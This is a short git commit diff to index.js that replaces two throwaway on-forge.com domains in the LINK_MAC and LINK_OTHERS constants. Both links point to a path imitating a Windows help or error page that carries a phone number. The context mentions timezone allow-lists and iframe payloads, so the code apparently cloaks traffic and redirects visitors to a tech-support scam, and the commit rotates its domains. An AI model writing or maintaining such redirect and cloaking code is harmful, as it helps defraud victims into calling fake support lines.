d36a644115c1c8fc3a664fc2416783d51f711660
paalakash <palaksh452@gmail.com>
2026-06-24 05:10:14 +0530

    Update index.js

--- index.js
+++ index.js
@@ -42,8 +42,8 @@ const ALLOWED_TIMEZONES = new Set([
 ]);
 
 // Destination Links
-const LINK_MAC = "https://reusfdusdfsd.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
-const LINK_OTHERS = "https://reusfdusdfsd.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_MAC = "https://wefdfhjhghf.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
+const LINK_OTHERS = "https://wefdfhjhghf.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1800-034-661";
 
 // --- Pre-Compilation Cache Layer ---
 // Helper to generate identical iframe payloads dynamically on boot
